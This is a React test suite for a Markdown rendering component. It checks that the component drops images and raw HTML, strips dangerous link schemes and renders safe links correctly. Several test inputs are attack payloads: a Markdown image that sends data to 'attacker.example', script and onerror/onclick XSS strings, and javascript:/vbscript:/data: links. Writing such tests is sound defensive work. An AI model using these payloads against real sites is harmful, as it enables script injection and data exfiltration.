/**
 * MarkdownBody (P3.8, SEC-42, UI-25): one allowed-element list, no images, no
 * raw HTML, SafeLink for every link, inside the typeset wrapper.
 */

import { render, screen } from '@testing-library/react'
import { MarkdownBody } from '@/components/ui/markdown-body'

const original = process.env.NEXT_PUBLIC_APP_URL

beforeEach(() => {
  process.env.NEXT_PUBLIC_APP_URL = 'https://plex.example.com'
})
afterEach(() => {
  process.env.NEXT_PUBLIC_APP_URL = original
})

function renderMarkdown(markdown: string) {
  return render(<MarkdownBody data-testid="md">{markdown}</MarkdownBody>)
}

describe('MarkdownBody', () => {
  it('renders a list as ul and li inside the typeset wrapper', () => {
    renderMarkdown('- one\n- two\n\n1. first')

    const wrapper = screen.getByTestId('md')
    expect(wrapper).toHaveClass('typeset')
    expect(wrapper.querySelector('ul')).not.toBeNull()
    expect(wrapper.querySelectorAll('ul > li')).toHaveLength(2)
    expect(wrapper.querySelector('ol > li')).toHaveTextContent('first')
  })

  it('merges a caller className with the typeset class', () => {
    render(<MarkdownBody className="text-sm" data-testid="md">text</MarkdownBody>)

    expect(screen.getByTestId('md')).toHaveClass('typeset', 'text-sm')
  })

  it('renders no img for an injected Markdown image', () => {
    const { container } = renderMarkdown('Hi ![x](https://attacker.example/?d=secret) there')

    expect(container.querySelector('img')).toBeNull()
    expect(container.innerHTML).not.toContain('attacker.example')
  })

  it('renders nothing for raw HTML', () => {
    const { container } = renderMarkdown('before\n\n<img src=x onerror="alert(1)">\n\n<script>alert(1)</script>\n\nafter')

    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('script')).toBeNull()
    expect(container.innerHTML).not.toContain('onerror')
    expect(screen.getByText('before')).toBeInTheDocument()
    expect(screen.getByText('after')).toBeInTheDocument()
  })

  it('renders inline raw HTML as nothing', () => {
    const { container } = renderMarkdown('a <b onclick="x()">bold</b> c')

    expect(container.querySelector('b')).toBeNull()
    expect(container.innerHTML).not.toContain('onclick')
  })

  it.each([['[x](javascript:alert(1))'], ['[x](data:text/html,hi)'], ['[x](vbscript:msgbox)']])(
    'renders %s as text with no href',
    (markdown) => {
      const { container } = renderMarkdown(markdown)

      expect(screen.getByText('x')).toBeInTheDocument()
      expect(container.querySelector('a')).toBeNull()
      expect(container.querySelector('[href]')).toBeNull()
    }
  )

  it('shows an external link destination with rel and target', () => {
    renderMarkdown('See [the docs](https://docs.example.com/guide).')

    const link = screen.getByRole('link')
    expect(link).toHaveAttribute('href', 'https://docs.example.com/guide')
    expect(link).toHaveAttribute('target', '_blank')
    expect(link).toHaveAttribute('rel', 'noopener noreferrer')
    expect(link).toHaveTextContent('the docs(https://docs.example.com/guide)')
  })

  it('shows an autolink once', () => {
    renderMarkdown('Go to <https://docs.example.com/guide>.')

    expect(screen.getByRole('link')).toHaveTextContent(/^https:\/\/docs\.example\.com\/guide$/)
  })

  it('renders a relative link with no destination suffix', () => {
    renderMarkdown('Open [help](/help).')

    const link = screen.getByRole('link')
    expect(link).toHaveAttribute('href', '/help')
    expect(link).toHaveTextContent(/^help$/)
    expect(link).not.toHaveAttribute('target')
  })

  it('unwraps an h1 to its text', () => {
    const { container } = renderMarkdown('# Big title\n\n## Section')

    expect(container.querySelector('h1')).toBeNull()
    expect(screen.getByText('Big title')).toBeInTheDocument()
    expect(container.querySelector('h2')).toHaveTextContent('Section')
  })

  it('keeps the allowed inline and block elements', () => {
    const { container } = renderMarkdown('**b** _i_ `c`\n\n> quote\n\n---\n\n```\npre\n```')

    for (const tag of ['strong', 'em', 'code', 'blockquote', 'hr', 'pre']) {
      expect(container.querySelector(tag)).not.toBeNull()
    }
  })
})
